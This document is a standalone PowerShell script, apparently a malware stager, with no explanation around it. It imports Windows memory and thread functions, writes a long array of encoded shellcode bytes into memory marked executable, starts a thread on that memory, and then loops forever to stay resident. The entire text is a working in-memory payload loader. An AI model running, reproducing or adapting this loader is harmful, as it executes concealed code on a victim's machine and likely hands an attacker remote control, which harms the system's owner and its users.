
$j3wg = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $j3wg -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xda,0xbb,0x3f,0x54,0x9b,0xaa,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x57,0x83,0xc2,0x04,0x31,0x5a,0x16,0x03,0x5a,0x16,0xe2,0xca,0xa8,0x73,0x28,0x34,0x51,0x84,0x4d,0xbd,0xb4,0xb5,0x4d,0xd9,0xbd,0xe6,0x7d,0xaa,0x90,0x0a,0xf5,0xfe,0x00,0x98,0x7b,0xd6,0x27,0x29,0x31,0x00,0x09,0xaa,0x6a,0x70,0x08,0x28,0x71,0xa4,0xea,0x11,0xba,0xb9,0xeb,0x56,0xa7,0x33,0xb9,0x0f,0xa3,0xe1,0x2e,0x3b,0xf9,0x39,0xc4,0x77,0xef,0x39,0x39,0xcf,0x0e,0x68,0xec,0x5b,0x49,0xaa,0x0e,0x8f,0xe1,0xe3,0x08,0xcc,0xcc,0xba,0xa3,0x26,0xba,0x3d,0x62,0x77,0x43,0x91,0x4b,0xb7,0xb6,0xe8,0x8c,0x70,0x29,0x9f,0xe4,0x82,0xd4,0xa7,0x32,0xf8,0x02,0x22,0xa1,0x5a,0xc0,0x94,0x0d,0x5a,0x05,0x42,0xc5,0x50,0xe2,0x01,0x81,0x74,0xf5,0xc6,0xb9,0x81,0x7e,0xe9,0x6d,0x00,0xc4,0xcd,0xa9,0x48,0x9e,0x6c,0xeb,0x34,0x71,0x91,0xeb,0x96,0x2e,0x37,0x67,0x3a,0x3a,0x4a,0x2a,0x53,0xd2,0x31,0xa1,0xa3,0x42,0xce,0x20,0xca,0xfb,0x64,0xdb,0x5e,0x8b,0xa2,0x1c,0xa0,0xa6,0x9b,0xf9,0x0d,0x1a,0x88,0xae,0xe2,0xf4,0x14,0x07,0x7c,0xa2,0x97,0x72,0x2d,0xff,0x0d,0x7e,0x81,0xac,0xb9,0x3b,0x24,0x53,0x39,0xd4,0xab,0x53,0x39,0x24,0x9b,0x60,0x6d,0x77,0xd7,0xc8,0x8d,0x27,0x7f,0x82,0x04,0x58,0xb9,0xd3,0xc3,0xee,0x80,0x7f,0x83,0xf0,0x3e,0x60,0xd7,0xa2,0x6d,0x33,0x80,0x17,0xc4,0xdb,0xc5,0xcd,0xc6,0x20,0xe6,0x3b,0x80,0x3d,0x12,0x9b,0xc5,0x41,0x11,0x23,0x16,0xcb,0xb5,0x49,0x12,0x9b,0x5f,0x91,0x4c,0x73,0xea,0xeb,0xee,0x05,0xeb,0x21,0x5d,0x59,0x40,0x99,0x34,0x35,0x4b,0x1b,0xa1,0xbe,0x6c,0xf6,0x54,0x80,0xe7,0xf3,0x19,0x74,0xde,0x6c,0x56,0xc3,0x42,0x3a,0x69,0xf9,0xe8,0x83,0xfd,0x02,0xfc,0x03,0xfe,0x6a,0xfc,0x03,0xbe,0x6a,0xaf,0x6b,0x66,0xcf,0x1c,0x89,0x69,0xda,0x31,0x02,0xc5,0x6c,0xd2,0xf2,0x81,0x6e,0x3c,0xfd,0x51,0x3c,0x6a,0x95,0x43,0x54,0x1b,0x87,0x9b,0x8d,0x9e,0x88,0x10,0xe3,0x2b,0x0f,0xd8,0x38,0xae,0xd0,0xaf,0x5b,0xe8,0x13,0x10,0x4c,0x7d,0x6b,0x50,0x73,0x4c,0xab,0x9b,0xa2,0x9f,0xfc,0xd2,0x94,0xed,0x37,0x24,0xc7,0x20,0x0e,0x75,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$V4R=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($V4R.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$V4R,0,0,0);for (;;){Start-sleep 60};

